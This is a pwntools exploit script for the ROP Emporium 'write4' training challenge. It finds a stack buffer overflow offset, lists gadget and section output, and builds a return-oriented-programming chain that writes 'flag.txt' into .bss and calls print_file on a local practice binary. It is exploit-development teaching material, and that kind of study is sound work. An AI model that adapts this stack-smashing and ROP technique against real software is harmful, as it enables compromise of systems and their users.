from pwn import *

# On completing our usual checks for interesting strings and symbols in
# this binary we're confronted with the stark truth that our favourite
# string "/bin/cat flag.txt" is not present this time. Although you'll
# see later that there are other ways around this problem, such as
# resolving dynamically loaded libraries and using the strings present
# in those, we'll stick to the challenge goal which is learning how to
# get data into the target process's virtual address space via the magic
# of ROP.

# Things have been rearranged a little for this challenge; the printing
# logic has been moved into a separate library in an attempt to mitigate
# the alternate solution that is possible in the callme challenge. The
# stack smash also takes place in a function within that library, but
# don't worry this will have no effect on your ROP chain.  Important!  A
# PLT entry for a function named print_file() exists within the
# challenge binary, simply call it with the name of a file you wish to
# read (like "flag.txt") as the 1st argument.

# Hopefully you've realised that ROP is just a form of arbitrary code
# execution and if we get creative we can leverage it to do things like
# write to or read from memory. The question we need to answer is: what
# mechanism are we going to use to solve this problem? Is there any
# built-in functionality to do the writing or do we need to use gadgets?
# In this challenge we won't be using built-in functionality since
# that's too similar to the previous challenges, instead we'll be
# looking for gadgets that let us write a value to memory such as mov
# [reg], reg.

# Perhaps the most important thing to consider in this challenge is
# where we're going to write our "flag.txt" string. Use rabin2 or
# readelf to check out the different sections of this binary and their
# permissions. Learn a little about ELF sections and their
# purpose. Consider how much space each section might give you to work
# with and whether corrupting the information stored at these locations
# will cause you problems later if you need some kind of stability from
# this program.

# Once you've figured out how to write your string into memory and where
# to write it, go ahead and call print_file() with its location as its
# only argument. You could consider wrapping your write gadgets in
# helper a function; if you can write a 4 or 8 byte value to a location
# in memory, you could craft a function (e.g. in Python using pwntools)
# that takes a string and a memory location and returns a ROP chain that
# will write that string to your chosen location. Crafting templates
# like this will make your life much easier in the long run. As ever,
# with the MIPS challenge don't forget about the branch delay slot.

# Load binary into pwntools
elf = context.binary = ELF('write4')

# the following is if you want to debug this without being in a tmux.
# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# the following is for debugging in tmux.
context.terminal = ['tmux', 'splitw', '-h']

# Enable verbose logging
context.log_level = 'debug'

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# print length of the buffer
info("%s bufferlen", cyclic_find(pattern))


# Next, I need to find a gadget to write.

# $ ROPgadget --binary write4 --only "mov|pop|ret"Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400692 : pop r15 ; ret
# 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x0000000000400693 : pop rdi ; ret
# 0x0000000000400691 : pop rsi ; pop r15 ; ret
# 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004e6 : ret

# The gadget @ 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# looks nice
# It writes the content of edi into the memory referenced by rsi

# But there are even better ones:

# $ objdump -D write4 -M intel
# ...
# 0000000000400628 <usefulGadgets>:
#   400628:	4d 89 3e             	mov    QWORD PTR [r14],r15
#   40062b:	c3                   	ret
# ...
#   400690:	41 5e                	pop    r14
#   400692:	41 5f                	pop    r15
#   400694:	c3                   	ret    

# $ readelf -e write4
# ...
#   [Nr] Name              Type             Address           Offset Size              EntSize          Flags  Link  Info  Align
#   [24] .bss              NOBITS           0000000000601038  00001038 0000000000000008  0000000000000000  WA       0     0     1

poppop = p64(0x0000000000400690)  # pop r14; pop r15; ret;
write = p64(0x0000000000400628)  # mov QWORD PTR [r14],r15
flagtxt = p64(0x7478742E67616C66)  # "flag.txt" (in reverse)
bss_addr = p64(0x0000000000601038)  # start of bss, where we want to write
pop_rdi = p64(0x0000000000400693)  # pop rdi ; ret

rop = ROP(elf)

# poppop = 0x080485aa  # pop edi; pop ebp;ret
# data_start = elf.symbols.data_start  # 0x0804a018
# mov = 0x08048543  # mov DWORD PTR [edi],ebp

# write "flag.txt"
rop = b""
rop += poppop
rop += bss_addr
rop += flagtxt
rop += write

# call sym.imp.print_file with bss as argument (put adress of bss into rdi)
rop += pop_rdi
rop += bss_addr
rop += p64(elf.symbols.plt.print_file)

payload = flat({
    pattern: rop
})

with open("payload", "wb") as f:
    f.write(payload)

# Send the payload to a new copy of the process
io = process(elf.path)
# io.wait()
io.sendline(payload)
# gdb.attach(io, gdbscript='continue')
# io.wait()
# io.recv()
io.recvuntil("Thank you!\n")
flag = io.recvline()
print(flag)
